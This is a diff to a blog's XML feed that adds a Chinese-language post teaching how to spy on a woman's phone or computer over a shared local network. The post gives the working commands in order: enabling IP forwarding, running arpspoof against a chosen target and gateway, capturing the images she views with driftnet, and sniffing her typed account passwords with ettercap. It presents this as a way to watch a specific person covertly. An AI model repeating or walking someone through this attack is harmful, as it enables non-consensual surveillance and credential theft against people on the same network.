@@ -3,6 +3,33 @@
   
     
     <entry>
+      <title>局域网查看妹子图片和妹子账号密码</title>
+      <link href="/2018/11/11/%E5%B1%80%E5%9F%9F%E7%BD%91%E6%9F%A5%E7%9C%8B%E5%A6%B9%E5%AD%90%E5%9B%BE%E7%89%87%E5%92%8C%E5%A6%B9%E5%AD%90%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/"/>
+      <url>/2018/11/11/%E5%B1%80%E5%9F%9F%E7%BD%91%E6%9F%A5%E7%9C%8B%E5%A6%B9%E5%AD%90%E5%9B%BE%E7%89%87%E5%92%8C%E5%A6%B9%E5%AD%90%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/</url>
+      
+        <content type="html"><![CDATA[<p>本章我来教你们查看局域网里面妹子手机或者电脑在查看的图片,和输入的账号密码。</p><h3 id="1、所需材料"><a href="#1、所需材料" class="headerlink" title="1、所需材料"></a>1、所需材料</h3><blockquote><p>linux kali 前几章已经教了如何安装还没安装的小伙伴可以去看看!</p></blockquote><h3 id="2、查看自己的IP以及网卡"><a href="#2、查看自己的IP以及网卡" class="headerlink" title="2、查看自己的IP以及网卡"></a>2、查看自己的IP以及网卡</h3><p>打开终端,在终端里面输入 #ifconfig</p><p><img src="https://i.loli.net/2018/11/11/5be80a6600d97.png" alt="1.png"></p><p>然后查看一下自己有获取到ip的网卡,我这边是wlan0默认都是eth0。</p><p><img src="https://i.loli.net/2018/11/11/5be80c329aa16.png" alt="2.png"></p><h3 id="3、转发ip"><a href="#3、转发ip" class="headerlink" title="3、转发ip"></a>3、转发ip</h3><p>在命令行里面输入 echo 1 &gt; /proc/sys/net/ipv4/ip_forward 不然等一下妹子会断网</p><p><img src="https://i.loli.net/2018/11/11/5be80dbc36197.png" alt="3.png"></p><h3 id="3、arp欺骗"><a href="#3、arp欺骗" class="headerlink" title="3、arp欺骗"></a>3、arp欺骗</h3><p>在终端输入 arpspoof  -i 网卡 -t 目标ip 网关     <strong>我这里网卡是wlan0默认一般是eth0，目标ip就是妹子的ip，网关把你ip最后一位改为1就是了。</strong></p><p><img src="https://i.loli.net/2018/11/11/5be80f3c43da1.png" alt="4.png"></p><p>填好</p><p><img src="https://i.loli.net/2018/11/11/5be80f88344b1.png" alt="5.png"></p><p>欺骗成功，这个终端保持打开不要关闭，关闭就停止欺骗了。</p><p><img src="https://i.loli.net/2018/11/11/5be8102c41caa.png" alt="6.png"></p><h3 id="4、图片嗅探"><a href="#4、图片嗅探" class="headerlink" title="4、图片嗅探"></a>4、图片嗅探</h3><p>打开一个新的终端,右键左栏的终端图标点击第二个打开一个新终端。</p><p><img src="https://i.loli.net/2018/11/11/5be8114e9babd.png" alt="7.png"></p><p>在新打开的终端里面输入 driftnet -i 网卡 我这里是wlan0</p><p><img src="https://i.loli.net/2018/11/11/5be8124d11bbd.png" alt="8.png"></p><p>然后会出现一个叫driftnet的窗口上面会显示妹子正在看的图片。</p><p><img src="https://i.loli.net/2018/11/11/5be812ad2cc81.jpg" alt="9.jpg"></p><p>点击图片还可以保存哦！</p><h3 id="5、账号密码嗅探"><a href="#5、账号密码嗅探" class="headerlink" title="5、账号密码嗅探"></a>5、账号密码嗅探</h3><p>打开一个新的终端,右键左栏的终端图标点击第二个打开一个新终端。</p><p><img src="https://i.loli.net/2018/11/11/5be8114e9babd.png" alt="7.png"></p><p>在新打开的终端里面输入 ettercap -Tq -i 网卡 我这里是wlan0</p><p><img src="https://i.loli.net/2018/11/11/5be81408b9bd6.png" alt="10.png"></p><p>开启完成</p><p><img src="https://i.loli.net/2018/11/11/5be81490c8328.png" alt="11.png"></p><p>然后等待妹子在网站输入账号密码。因为我是拿我自己的手机来试验我就顺便找了个网站输入了账号密码。</p><p><img src="https://i.loli.net/2018/11/11/5be81612b353c.png" alt="12.png"></p><p>版权声明：本文为博主原创文章,转载请标明出处。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 局域网安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> kali </tag>
+            
+            <tag> 渗透工具 </tag>
+            
+            <tag> 局域网安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    <entry>
       <title>nmap进阶使用</title>
       <link href="/2018/11/10/nmap%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8/"/>
       <url>/2018/11/10/nmap%E8%BF%9B%E9%98%B6%E4%BD%BF%E7%94%A8/</url>
@@ -92,7 +119,7 @@
             
             <tag> kali </tag>
             
-            <tag> linux </tag>
+            <tag> Linux </tag>
             
         </tags>
       
